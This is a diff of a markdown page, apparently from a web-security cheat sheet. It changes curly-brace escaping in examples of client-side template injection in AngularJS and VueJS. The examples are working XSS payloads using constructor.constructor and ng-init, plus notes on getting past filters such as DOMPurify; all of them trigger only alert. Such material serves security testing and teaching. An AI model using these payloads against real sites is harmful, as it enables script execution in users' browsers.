@@ -11,7 +11,7 @@ Below are practical examples for popular frameworks.
 AngularJS is a common frontend framework. It uses special attributes and syntax to add interactivity, but this can enable HTML/text injections that execute arbitrary JavaScript if not properly handled.\
 A key point: these injections only work if an element has an `ng-app` attribute. Once enabled, it opens up multiple attack paths.
 
-When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `{{` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.
+When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `&#123;&#123;` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.
 
 **Example payloads (all trigger `alert`):**
 
@@ -20,7 +20,7 @@ When this is enabled, however, many possibilities open up. One of the most inter
 
 <body ng-app>
   <!-- Text injection -->
-  {{constructor.constructor('alert(1)')()}}
+  &#123;&#123;constructor.constructor('alert(1)')()}}
   <!-- Attribute injection -->
   <ANY ng-init="constructor.constructor('alert(2)')()"></ANY>
   <!-- Filter bypass (even DOMPurify!) -->
@@ -58,8 +58,8 @@ VueJS template injection is possible via similar constructor tricks:
 <script src="https://cdn.jsdelivr.net/npm/vue@2.5.13/dist/vue.js"></script>
 
 <div id="app">
-  <p>{{this.constructor.constructor('alert(1)')()}}</p>
-  <p>{{this.$el.ownerDocument.defaultView.alert(2)}}</p>
+  <p>&#123;&#123;this.constructor.constructor('alert(1)')()}}</p>
+  <p>&#123;&#123;this.$el.ownerDocument.defaultView.alert(2)}}</p>
 </div>
 <script>
   new Vue({
